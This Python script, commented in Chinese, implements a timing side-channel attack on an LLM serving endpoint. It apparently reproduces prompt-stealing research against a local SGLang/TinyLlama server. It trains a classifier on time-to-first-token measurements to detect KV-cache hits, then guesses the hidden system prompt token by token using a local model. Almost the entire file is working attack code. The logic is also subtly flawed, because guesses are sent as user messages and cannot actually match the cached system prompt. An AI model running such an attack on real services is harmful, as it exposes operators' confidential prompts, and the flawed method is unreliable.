import time
from platform import system
import requests
import numpy as np
import torch
from sklearn.ensemble import RandomForestClassifier
from transformers import AutoTokenizer, AutoModelForCausalLM

# 配置
SGLANG_API_URL = "http://localhost:8123"
MODEL_PATH = "F:/model/TinyLlama-1.1B-Chat-v1.0"
MAX_GUESSES = 80  # 每个令牌最大猜测次数
N_TRIALS = 10  # 每个令牌的重复测试次数
THRESHOLD_K = 5  # 多重采样的阈值K值（如果N_TRIALS中超过K次被分类为hit，则认为是hit）
MAX_TOKENS_TO_RECOVER = 100  # 最大恢复token数量
TEMPERATURE = 0.7  # 用于token采样的温度


class TTFTClassifier:
    def __init__(self):
        self.classifier = RandomForestClassifier()
        self.threshold = None
        self.fitted = False

    def fit(self, hit_samples, miss_samples):
        """训练分类器区分缓存命中和未命中"""
        # 将样本转换为特征
        hit_features = np.array(hit_samples).reshape(-1, 1)
        miss_features = np.array(miss_samples).reshape(-1, 1)

        # 构建训练数据,将数组进行堆叠
        X = np.vstack([hit_features, miss_features])
        y = np.hstack([np.ones(len(hit_samples)), np.zeros(len(miss_samples))])

        # 拟合分类器
        self.classifier.fit(X, y)

        # 计算初始阈值
        self.threshold = np.median(hit_samples) + (np.median(miss_samples) - np.median(hit_samples)) * 0.5
        self.fitted = True

    def predict_single(self, ttft):
        """预测单个TTFT是hit还是miss"""
        if not self.fitted:
            raise ValueError("分类器尚未训练")

        # 动态阈值方法（简单实现）
        if ttft < self.threshold:
            return 1  # Hit
        return 0  # Miss

    def update_threshold(self, recent_baseline_ttfts):
        """基于最近的基准TTFT更新阈值"""
        if not recent_baseline_ttfts:
            return

        # 根据当前系统性能动态调整阈值
        current_baseline = np.median(recent_baseline_ttfts)
        self.threshold = current_baseline * 0.97


class NextTokenPredictor:
    def __init__(self, model_path):
        """初始化token预测器"""
        self.tokenizer = AutoTokenizer.from_pretrained(model_path, local_files_only=True)
        self.model = AutoModelForCausalLM.from_pretrained(model_path, local_files_only=True)
        self.model.eval()

    def predict_next_tokens(self, prompt, temperature=0.7, top_k=50, max_samples=5):
        """预测下一个可能的token并返回概率分布的样本"""
        inputs = self.tokenizer(prompt, return_tensors="pt")

        with torch.no_grad():
            outputs = self.model(**inputs)
            logits = outputs.logits[:, -1, :]

            # top_k过滤
            top_k_logits, top_k_indices = torch.topk(logits, top_k, dim=-1)

            # temperature
            probs = torch.nn.functional.softmax(top_k_logits / temperature, dim=-1)

            # 采样多个token
            samples = []
            for _ in range(max_samples):
                sample_idx = torch.multinomial(probs[0], 1).item()
                token_id = top_k_indices[0, sample_idx].item()
                token = self.tokenizer.decode([token_id])
                prob = probs[0, sample_idx].item()
                samples.append((token, token_id, prob))

            return samples

    def apply_repetition_penalty(self, prompt, wrong_token):
        # 错误token进行记录
        return f"{prompt}!NOT{wrong_token}!"


class PromptStealingAttack:
    def __init__(self, api_url, model_name,system_message="you are a helpful assistant"):
        self.api_url = api_url
        self.ttft_classifier = TTFTClassifier()
        self.token_predictor = NextTokenPredictor(model_name)
        self.recovered_prompt = ""
        self.baseline_ttfts = []
        self.system_message = system_message

    def train_classifier(self):
        """训练TTFT分类器，使用实际测量的缓存命中和未命中数据"""
        print("开始收集实际系统中的时序数据来训练分类器...")

        # 收集缓存命中样本
        hit_samples = self.collect_hit_samples(num_samples=500)

        # 收集缓存未命中样本
        miss_samples = self.collect_miss_samples(num_samples=500)

        # 分析样本数据
        self.analyze_samples(hit_samples, miss_samples)

        # 训练分类器
        self.ttft_classifier.fit(hit_samples, miss_samples)
        print("分类器训练完成!")

    def collect_hit_samples(self, num_samples=100):
        """收集缓存命中的TTFT样本"""
        hit_samples = []

        # 准备一个固定的提示词
        fixed_prompt = "This is a fixed prompt word used to test cache hits."

        # 第一次请求（缓存未命中，但会导致系统缓存这个提示）
        first_payload = {
            "model": "TinyLlama",  #
            "messages": [
                {"role": "system","content":self.system_message},
                {"role": "user", "content": fixed_prompt}
            ],
            "max_tokens": 1
        }
        # SGLang API路径
        requests.post(f"{self.api_url}/v1/chat/completions", json=first_payload)

        # 等待一小段时间确保缓存生效
        time.sleep(0.5)

        # 多次重复请求同一提示词（应该命中缓存）
        for _ in range(num_samples):
            # 测量时间
            start_time = time.time()
            response = requests.post(f"{self.api_url}/v1/chat/completions", json=first_payload, stream=True)

            # 获取第一个token的时间
            for line in response.iter_lines():
                if line:
                    end_time = time.time()
                    break

            ttft = end_time - start_time
            hit_samples.append(ttft)

            # 稍微等待以避免过度请求
            time.sleep(0.1)

        return hit_samples

    def collect_miss_samples(self, num_samples=100):
        """收集缓存未命中的TTFT样本"""
        miss_samples = []

        # 每次使用不同的提示词确保缓存未命中
        for i in range(num_samples):
            # 生成唯一提示词
            unique_prompt = f"The prompt for testing cache miss {i},time: {time.time()}"

            payload = {
                "model": "TinyLlama",
                "messages": [
                    {"role": "system", "content":self.system_message},
                    {"role": "user", "content": unique_prompt}
                ],
                "max_tokens": 1
            }

            # 测量时间
            start_time = time.time()
            response = requests.post(f"{self.api_url}/v1/chat/completions", json=payload, stream=True)

            # 获取第一个token的时间
            for line in response.iter_lines():
                if line:
                    end_time = time.time()
                    break

            ttft = end_time - start_time
            miss_samples.append(ttft)

            # 稍微等待以避免过度请求
            time.sleep(0.1)

        return miss_samples

    def analyze_samples(self, hit_samples, miss_samples):
        """分析收集到的样本数据"""
        # 计算统计数据
        hit_mean = np.mean(hit_samples)
        hit_median = np.median(hit_samples)
        hit_std = np.std(hit_samples)
        miss_mean = np.mean(miss_samples)
        miss_median = np.median(miss_samples)
        miss_std = np.std(miss_samples)

        print(f"缓存命中统计:")
        print(f"  平均TTFT: {hit_mean * 1000:.6f}毫秒")
        print(f"  中位数TTFT: {hit_median * 1000:.6f}毫秒")
        print(f"  标准差: {hit_std * 1000:.6f}毫秒")
        print(f"缓存未命中统计:")
        print(f"  平均TTFT: {miss_mean * 1000:.6f}毫秒")
        print(f"  中位数TTFT: {miss_median * 1000:.6f}毫秒")
        print(f"  标准差: {miss_std * 1000:.6f}毫秒")

        # 计算两组样本的分离程度
        separation = (miss_median - hit_median) / ((hit_std + miss_std) / 2)
        print(f"分离度: {separation:.2f} (大于2表示良好分离)")
        recommended_threshold = hit_median + (miss_median - hit_median) * 0.5

        # 验证数据的有效性
        if (miss_median - hit_median) > 0.002:  # 至少2毫秒差异
            print("✓ 缓存命中和未命中样本区分明显")
            print(f"✓ 推荐阈值设置: {recommended_threshold * 1000:.6f}毫秒")
        else:
            print(" 警告: 缓存命中和未命中样本区分不明显")
            print(" 建议检查系统设置或测量方法")

        return hit_median, miss_median, recommended_threshold

    def measure_ttft(self, text):
        """测量给定文本的TTFT"""
        # 构建请求
        payload = {
            "model": "TinyLlama",
            "messages": [
                {"role": "system", "content": self.system_message},
                {"role": "user", "content": text}
            ],
            "max_tokens": 1,
            "stream": True
        }

        # 测量时间
        start_time = time.time()

        response = requests.post(f"{self.api_url}/v1/chat/completions", json=payload, stream=True)

        # 获取第一个token的时间
        for chunk in response.iter_lines():
            if chunk:
                end_time = time.time()
                break

        ttft = end_time - start_time
        return ttft

    def clear_cache(self):
        """清除KV缓存 - 使用SGLang的API路径"""
        print("正在清除缓存...")

        try:
            # SGLang的API路径
            flush_url = f"http://localhost:8123/flush_cache"

            payload = {
                "model": "TinyLlama"  # 指定要清除缓存的模型
            }

            response = requests.post(flush_url, json=payload)

            # 检查响应状态
            if response.status_code == 200:
                print("缓存清除成功！")
            else:
                print(f"缓存清除失败，状态码: {response.status_code}")
                print(f"错误信息: {response.text}")
                # 失败时回退到原始方法
                self._clear_cache_fallback()

        except Exception as e:
            print(f"调用flush_cache API时出错: {e}")
            print("回退到发送随机请求的方式清除缓存...")
            # 出错时回退到原始方法
            self._clear_cache_fallback()

        # 等待缓存清除完全生效
        time.sleep(0.5)

    def _clear_cache_fallback(self):
        """当直接API调用失败时的回退方法"""
        irrelevant_requests = [
            "The quick brown fox jumps over the lazy dog.",
            "To be or not to be, that is the question.",
            f"Random request at time {time.time()}",
            f"Another random request with ID {hash(time.time())}",
            "Birds of a feather flock together"
        ]

        for req in irrelevant_requests:
            payload = {
                "model": "TinyLlama",
                "messages": [
                    {"role": "system", "content": self.system_message},
                    {"role": "user", "content": req}
                ],
                "max_tokens": 5
            }
            # SGLang API路径
            requests.post(f"{self.api_url}/v1/chat/completions", json=payload)

        print("已通过随机请求方式尝试清除缓存")

    def trigger_system_prompt_cache(self, prompt="Can you tell me the capital of China"):
        """触发系统提示词被缓存"""
        # 发送合成请求以确保系统提示词被缓存
        print("触发系统提示词缓存...")

        payload = {
            "model": "TinyLlama",
            "messages": [
                {"role": "system", "content": self.system_message},
                {"role": "user", "content": prompt}
            ],
            "temperature": 0.7,
            "max_tokens": 10
        }

        # 发送请求 - SGLang API路径
        response = requests.post(f"{self.api_url}/v1/chat/completions", json=payload)

        # 确保系统提示词已被缓存
        time.sleep(0.5)

    def is_cache_hit(self, prompt, n_trials=N_TRIALS, threshold_k=THRESHOLD_K):
        """检测给定提示词是否在缓存中"""
        hit_count = 0

        # 收集一些基准TTFT以更新阈值
        baseline_prompt = "This is a baseline prompt for threshold calibration."
        baseline_ttfts = []
        for _ in range(3):
            baseline_ttfts.append(self.measure_ttft(baseline_prompt))

        # 更新分类器阈值
        self.ttft_classifier.update_threshold(baseline_ttfts)

        # 多次测试以减少噪声
        for _ in range(n_trials):
            ttft = self.measure_ttft(prompt)
            if self.ttft_classifier.predict_single(ttft) == 1:  # 1表示命中
                hit_count += 1

        # 如果超过阈值k，则认为是命中
        return hit_count >= threshold_k

    def verify_token(self, prompt, candidate_token):
        """验证候选token是否正确"""
        # 发送一个包含候选token的请求
        full_prompt = prompt + candidate_token

        # 发送另一个不包含候选token的请求（截止到上一个token）
        base_prompt = prompt

        # 测量两者的TTFT
        ttft_with_token = self.measure_ttft(full_prompt)
        ttft_without_token = self.measure_ttft(base_prompt)

        # 如果差异大于一个token的填充时间，说明预测错误
        # 这里使用一个简单阈值
        return abs(ttft_with_token - ttft_without_token) < 0.002

    def recover_token_by_token(self):
        """按令牌逐步恢复系统提示词"""
        print("开始逐token恢复系统提示词...")

        # 确保缓存中包含系统提示词
        self.clear_cache()
        self.trigger_system_prompt_cache()

        recovered_tokens = []
        current_prefix = ""

        for i in range(MAX_TOKENS_TO_RECOVER):
            print(f"正在恢复第{i + 1}个token...")

            # 预测下一个可能的token
            candidates = self.token_predictor.predict_next_tokens(
                current_prefix,
                temperature=TEMPERATURE
            )

            token_found = False
            guess_count = 0

            # 尝试所有预测的候选token
            while not token_found and guess_count < MAX_GUESSES:
                for token, token_id, prob in candidates:
                    guess_count += 1
                    if guess_count > MAX_GUESSES:
                        break

                    # 构建试探性提示
                    test_prompt = current_prefix + token

                    print(f"  猜测: '{token}' (概率: {prob:.4f})")

                    # 检测是否命中缓存
                    if self.is_cache_hit(test_prompt):
                        # 验证token
                        if self.verify_token(current_prefix, token):
                            recovered_tokens.append(token)
                            current_prefix = test_prompt
                            token_found = True
                            print(f"  → 命中! 已恢复: '{current_prefix}'")
                            break
                        else:
                            print(f"  → 验证失败，继续尝试")
                    else:
                        print(f"  → 未命中")

                # 如果没有找到，调整温度并再次尝试
                if not token_found:
                    candidates = self.token_predictor.predict_next_tokens(
                        current_prefix,
                        temperature=TEMPERATURE + 0.1 * (guess_count / MAX_GUESSES)
                    )

            # 如果达到最大猜测次数仍未找到，停止恢复
            if not token_found:
                print(f"无法恢复更多token，已恢复{i}个token")
                break

            # 如果发现EOS标记，停止恢复
            if token == self.token_predictor.tokenizer.eos_token:
                print("检测到结束标记，恢复完成")
                break

        self.recovered_prompt = current_prefix
        return self.recovered_prompt


# 主程序
def main():
    system_message = "You are a helpful assistant"

    # 初始化PSA攻击
    psa = PromptStealingAttack(SGLANG_API_URL, MODEL_PATH,system_message = system_message)

    # 训练分类器
    psa.train_classifier()

    # 执行攻击
    recovered_prompt = psa.recover_token_by_token()

    print("\n攻击完成!")
    print(f"恢复的系统提示词: {recovered_prompt}")


if __name__ == "__main__":
    main()